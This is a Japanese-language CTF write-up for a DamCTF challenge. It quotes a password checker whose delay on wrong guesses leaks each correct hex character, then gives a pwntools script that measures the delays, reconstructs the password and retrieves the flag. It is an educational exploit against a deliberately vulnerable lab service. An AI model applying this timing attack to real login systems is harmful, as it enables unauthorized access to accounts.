# side-channel:misc:XXXXpts
We built a super-secure password checker.  
Can you guess what my password is?  
This challenge does NOT require brute forcing, you can get the flag with one connection.  
nc chals.damctf.xyz 30318  
[side-channel.py](side-channel.py)  

# Solution
side-channel.pyが配布される。  
これがサーバー側で動いているようだ。  
以下の関数に不審な点がある。  
```python
~~~
# the function that matters..
def guess_password(s):
    print("Password guessing %s" % s)
    typed_password = ''
    correct_password = True
    for i in range(len(password)):
        user_guess = input("Guess character at position password[%d] = %s?\n" \
                % (i, typed_password))
        typed_password += user_guess
        if user_guess != password[i]:
            # we will punish the users for supplying wrong char..
            time.sleep(0.3 * charactor_position_in_hex(password[i]))
            correct_password = False

    # to get the flag, please supply all 8 correct characters for the password..
    if correct_password:
        cat_flag()

    return correct_password
~~~
```
パスワードが異なる場合、罰として0.3秒単位の遅延が発生するようだ。  
それをツールで計測してやればよい。  
以下のside.pyで入力までを行う。  
```python:side.py
import time
from pwn import *

io = remote("chals.damctf.xyz", 30318)
times = [0] * 8

for i in range(6):
    io.recvline()

for i in range(len(times)):
    t = time.time()
    io.sendline("s")
    io.recvline()
    times[i] = time.time() - t
    print("times[{}]={}".format(i, times[i]))

for i in range(len(times)):
    ans = "{:x}".format(int(times[i] / 3 * 10))
    io.sendline(ans)
    io.recvline()
    print(ans)

io.interactive()
```
実行する。  
```bash
$ python side.py
[+] Opening connection to chals.damctf.xyz on port 30318: Done
times[0]=2.553088665008545
times[1]=3.4497413635253906
times[2]=1.9450631141662598
times[3]=4.6622090339660645
times[4]=1.9509341716766357
times[5]=0.44196557998657227
times[6]=1.6451160907745361
times[7]=3.75463604927063
8
b
6
f
6
1
5
c
[*] Switching to interactive mode
dam{d0nT_d3l4y_th3_pRoC3sSiNg}
```
flagが得られた。  

## dam{d0nT_d3l4y_th3_pRoC3sSiNg}